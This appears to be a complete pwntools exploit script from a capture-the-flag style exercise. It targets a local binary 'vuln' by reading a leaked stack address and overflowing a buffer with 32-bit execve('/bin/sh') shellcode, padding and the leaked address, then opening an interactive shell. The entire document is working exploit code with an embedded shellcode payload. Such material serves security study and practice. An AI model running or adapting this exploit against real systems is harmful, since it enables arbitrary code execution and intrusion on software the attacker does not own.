# Import pwn tools
from pwn import *

# Establish the target process, and attach gdb
target = process('vuln')
#gdb.attach(target')

# Get the address being leaked, strip the newline, and convert it to and integer
infoleak = target.recvline().replace("\x0a", "")
address = int(infoleak, 16) 

# Establish the shellcode:
'''
 8048060:   68 2f 73 68 00          push   0x68732f
 8048065:   68 2f 62 69 6e          push   0x6e69622f
 804806a:   89 e3                   mov    ebx,esp
 804806c:   31 d2                   xor    edx,edx
 804806e:   53                      push   ebx
 804806f:   52                      push   edx
 8048070:   89 e1                   mov    ecx,esp
 8048072:   b8 0b 00 00 00          mov    eax,0xb
 8048077:   cd 80                   int    0x80
'''

shellcode = "\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x53\x52\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80"

# Construct the payload
payload = shellcode + ((0x70 - len(shellcode))*"0") + p32(address)

# Send the payload
target.sendline(payload)

# Drop to an interactive shell
target.interactive()